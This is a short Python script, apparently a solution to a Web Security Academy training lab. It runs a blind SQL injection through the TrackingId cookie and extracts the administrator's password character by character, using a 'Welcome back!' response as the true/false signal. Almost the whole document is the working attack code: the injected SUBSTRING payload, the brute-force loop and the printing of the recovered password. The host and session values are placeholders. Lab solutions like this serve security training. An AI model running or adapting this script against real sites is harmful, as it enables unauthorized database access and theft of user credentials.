#!/usr/bin/python3

import string
import requests

def perform_blind_sqli_attack():

    # Characters that can be in the password
    characters = string.ascii_lowercase + string.digits
    
    # Indicator that the request is correct
    trigger = 'Welcome back!'
    
    # Change the next variables for correct values (host and cookies)
    host = '0a6d001e04d1278580043a760EXAMPLE.web-security-academy.net'
    tracking_id = 'tHsb9H2EXAMPLE'
    session = '3ChGY1Jp84OZaso3sSfBuEXAMPLE'
    
    # Variable to send in the request
    url = f'https://{host}/filter'
    params = {'category': 'Lifestyle'}
    headers = {
        'Host': host,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Dnt': '1',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document'
    }

    print('[!] Start Blind SQL injection...')

    # 
    character_password_position = 1
    password = ''
    finish = False
    
    # character by character will be analyzed, there are 2 cases:
    # 1. the character is found
    # 2. the character is not found, so the loop is exited
    while not finish:

        for w in characters:

            password_character = w

            # Construct the SQLi payload
            sqli = f"' AND (SELECT SUBSTRING(password, {character_password_position}, 1) FROM users WHERE username = 'administrator') = '{password_character}' -- -"
            
            # Introduce or remplace the Cookie with SQLi
            headers['Cookie'] = f"TrackingId={tracking_id}{sqli}; session={session}"

            print(f'\t[/] Test position ({character_password_position}) with ---> {password_character}')

            response = requests.get(url, params=params, headers=headers)

            # Save in the password
            if trigger in response.text:
                password += password_character
                print('\t[!] Character found')
                break

            # Leave 
            if w == characters[-1]:
                finish = True
        
        character_password_position += 1
        
    ascii_art = """"
            .--.
        |__| .--------.
        |=.| |.------.|
        |--| || SQLi ||
        |  | |'------'|
        |__|~')______('
    """
    
    print(ascii_art)
    print(f'[!] Password: {password}')

if __name__ == '__main__':
    perform_blind_sqli_attack()
